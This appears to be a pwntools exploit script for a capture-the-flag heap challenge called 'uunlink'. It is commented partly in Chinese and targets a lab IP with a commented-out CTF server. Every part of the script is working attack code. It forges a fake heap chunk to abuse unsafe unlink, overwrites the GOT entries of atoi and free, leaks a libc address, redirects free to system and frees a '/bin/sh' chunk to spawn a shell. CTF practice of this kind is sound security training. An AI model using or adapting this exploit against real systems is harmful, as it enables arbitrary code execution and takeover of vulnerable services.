'''
@Author       : 白银
@Date         : 2023-03-10 10:53:29
@LastEditors  : 白银
@LastEditTime : 2023-03-10 19:05:49
@FilePath     : /pwn/uunlink.py
@Description  : offbyone  https://www.bilibili.com/video/BV1Uv411j7fr?t=1686.3&p=20
@Attention    : 可能libc版本太高了，打不通
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 0

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './uunlink'
elf = ELF(pwnfile)

state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("node4.buuoj.cn", 27420)
    # libc = ELF('/home/jack/Desktop/libc.so.6')

    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/x64_libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/x86_libc.so.6')
else:
    io = process(pwnfile)

    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

def malloc(index, size):
    io.recvuntil("Your choice: ")
    io.sendline('1')
    io.recvuntil("Give me a book ID: ")
    io.sendline(str(index))
    io.recvuntil("how long: ")
    io.sendline(str(size))

def free(index):
    io.recvuntil("Your choice: ")
    io.sendline('3')
    io.recvuntil("Which one to throw?")
    io.sendline(str(index))

def edit(index, size, content):
    io.recvuntil("Your choice: ")
    io.sendline('4')
    io.recvuntil("Which book to write?")
    io.sendline(str(index))
    io.recvuntil("how big?")
    io.sendline(str(size))
    io.recvuntil("Content: ")
    io.sendline(content)

atoi_got = elf.got["atoi"]
free_got = elf.got["free"]
puts_plt = elf.sym["puts"]

malloc(0, 0x30)
malloc(1, 0xf0)
malloc(2, 0x100)
malloc(3, 0x100)

# fd就是p-0x18，是固定的
# bk就是p-0x10是固定的
fd = 0x00602300-0x18 # 602300是malloc的chunk地址，ida找，这个就是p
bk = 0x00602300-0x10

payload = flat([0, 0x31])
payload += flat([fd, bk])
payload += flat([0, 0])
payload += flat([0x30, 0x100])
edit(0, 0x60, payload)
free(1)

payload = flat(['a' * 0x18])
payload += flat([atoi_got])
payload += flat([atoi_got])
payload += flat([free_got])
edit(0, 0x60, payload)
edit(2, 0x10, p64(puts_plt))
free(0)

io.recv(1)
addr = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym["atoi"]
print("addr ---> ", hex(addr))
system = addr + libc.sym["system"]
edit(2, 0x10, p64(system))
edit(3, 0x10, "/bin/sh\x00")
free(3)
io.interactive()